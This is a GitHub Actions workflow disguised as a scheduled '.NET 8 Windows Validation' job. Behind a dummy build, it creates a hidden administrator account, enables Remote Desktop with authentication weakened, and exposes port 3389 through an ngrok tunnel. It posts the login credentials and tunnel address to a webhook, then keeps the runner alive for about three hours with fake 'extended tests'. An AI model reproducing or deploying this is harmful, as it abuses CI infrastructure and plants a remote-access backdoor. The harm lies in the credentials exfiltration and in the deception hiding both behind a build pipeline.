name: .NET 8 Windows Validation

on:
  workflow_dispatch:
  schedule:
    - cron: '13 5,13,21 * * *'

jobs:
  build-test:
    runs-on: windows-2022
    timeout-minutes: 200

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup .NET SDK
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'

      - name: Create and build dummy project
        run: |
          dotnet new console -n ValidationApp -f net8.0
          cd ValidationApp
          dotnet add package Newtonsoft.Json --version 13.0.3
          dotnet add package Serilog --version 4.0.0
          dotnet add package Serilog.Sinks.Console --version 6.0.0
          dotnet add package Microsoft.Extensions.Logging --version 8.0.0
          @"
          using System;
          using Newtonsoft.Json;
          using Serilog;
          
          namespace ValidationApp
          {
              class Program
              {
                  static void Main()
                  {
                      Log.Logger = new LoggerConfiguration()
                          .WriteTo.Console()
                          .CreateLogger();
                      
                      var data = new { 
                          Message = "Build validated successfully", 
                          Timestamp = DateTime.UtcNow,
                          Version = "8.0.3"
                      };
                      
                      string json = JsonConvert.SerializeObject(data, Formatting.Indented);
                      Console.WriteLine(json);
                      Log.Information("Test completed at {Time}", DateTime.UtcNow);
                  }
              }
          }
          "@ | Out-File -Encoding utf8 Program.cs
          dotnet build -c Release
          dotnet run -c Release

      - name: Prepare environment
        id: prepare
        run: |
          $usr = "build_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
          $sec = ConvertTo-SecureString $pwd -AsPlainText -Force

          New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
          Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1

          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force

          # حفظ بيانات الدخول (ملف مؤقت) وإخراجها كـ outputs
          $creds = @{ User = $usr; Pass = $pwd } | ConvertTo-Json
          $creds | Out-File -Encoding utf8 "$env:TEMP\creds.json"
          echo "user=$usr" >> $env:GITHUB_OUTPUT
          echo "pass=$pwd" >> $env:GITHUB_OUTPUT

          # إرسال بيانات الدخول مشفرة (base64)
          $credsBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$usr : $pwd"))
          $body = @{
            content = "✅ **Build agent ready**`n`n**Encoded credentials:** ||$credsBase64||`n*(decode using base64)*"
          } | ConvertTo-Json
          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue

      - name: Setup ngrok tunnel
        run: |
          # قراءة بيانات المستخدم من الخطوة السابقة
          $usr = "${{ steps.prepare.outputs.user }}"
          $pwd = "${{ steps.prepare.outputs.pass }}"

          # تحميل ngrok لنظام Windows
          $ngrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
          $zipPath = "$env:TEMP\ngrok.zip"
          Invoke-WebRequest -Uri $ngrokUrl -OutFile $zipPath
          Expand-Archive -Path $zipPath -DestinationPath "$env:TEMP\ngrok" -Force

          # إضافة auth token (يجب تعريف secret NGROK_AUTH_TOKEN في المستودع)
          & "$env:TEMP\ngrok\ngrok.exe" config add-authtoken ${{ secrets.NGROK_AUTH_TOKEN }}

          # تشغيل ngrok في الخلفية مع توجيه TCP للمنفذ 3389
          $logFile = "$env:TEMP\ngrok.log"
          $proc = Start-Process -FilePath "$env:TEMP\ngrok\ngrok.exe" `
            -ArgumentList "tcp 3389 --log=stdout" `
            -NoNewWindow -RedirectStandardOutput $logFile -PassThru

          # انتظار حتى يظهر النفق (قد يحتاج 10-15 ثانية)
          Start-Sleep -Seconds 15

          # استخراج العنوان العام من ملف السجل
          $log = Get-Content $logFile -ErrorAction SilentlyContinue
          $addrLine = $log | Select-String -Pattern "started tunnel.*tcp://(.*)"
          if ($addrLine) {
            $publicAddr = $addrLine.Matches.Groups[1].Value
            # إرسال التفاصيل عبر webhook
            $message = "🌐 **ngrok tunnel active**`n`n**Address:** $publicAddr`n**User:** $usr`n**Pass:** ||$pwd||`n(استخدم العنوان في Remote Desktop)"
            $body = @{ content = $message } | ConvertTo-Json
            Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
            $env:TUNNEL_PID = $proc.Id
          } else {
            # فشل استخراج العنوان، نرسل تحذير ونستمر بدون نفق
            $message = "⚠️ **ngrok tunnel failed**`nCould not extract public address."
            $body = @{ content = $message } | ConvertTo-Json
            Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
            $proc | Stop-Process -Force
          }

      - name: Run extended tests
        run: |
          $end = (Get-Date).AddMinutes(190)
          while ((Get-Date) -lt $end) {
            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
            $minute = (Get-Date).Minute
            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
              cd ValidationApp
              dotnet build -c Release > $null
            }
            Start-Sleep -Seconds 900
          }

      - name: Cleanup
        run: |
          if ($env:TUNNEL_PID) {
            try { Stop-Process -Id $env:TUNNEL_PID -Force -ErrorAction SilentlyContinue } catch {}
          }
        continue-on-error: true

      - name: Finalize
        run: Write-Host "Validation completed successfully."
